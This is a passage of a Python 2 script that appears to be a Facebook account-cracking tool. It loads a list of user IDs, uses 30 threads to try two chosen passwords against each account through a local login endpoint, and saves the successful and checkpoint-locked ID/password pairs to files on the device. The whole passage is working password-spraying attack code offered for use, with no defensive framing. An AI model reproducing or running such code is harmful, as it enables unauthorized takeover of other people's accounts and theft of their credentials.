		pass2 = raw_input(" [2]Password: ")
		filelist = raw_input(" Input file: ")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;31mRequested file not found\033[0;97m")
			print("══════════════════════════════════════════════")
			raw_input(" Press enter to back ")
			choice_jam()
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t    \033[1;31mSelect valid option\033[0;97m")
		print("")
		choice_select_jam()
	print("Total IDs : "+str(len(id)))
	print("The Process has started")
	print("══════════════════════════════════════════════")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;90m[Jam-Ok] "+uid+" | "+pass1)
				ok = open("/sdcard/ids/sdcard/ids/jam_ok.txt", "a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print("\033[1;97m[Jam-Cp] "+uid+" | "+pass1)
					cp = open("/sdcard/ids/jam_cp.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;90m[Jam-Ok] "+uid+" | "+pass2)
						ok = open("/sdcard/ids/jam_ok.txt", "a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error"]:
							print("\033[1;97m[Jam-Cp] "+uid+" | "+pass2)
							cp = open("/sdcard/ids/jam_cp.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)

																
		except:
			pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print("══════════════════════════════════════════════")
	print(" The process has completed")
	print(" Total Ok/Cp:"+str(len(oks)))+"/"+str(len(cps))
	print("══════════════════════════════════════════════")
	raw_input(" Press enter to back")
	choice_jam()
	
if __name__ == '__main__':
	tlogin()

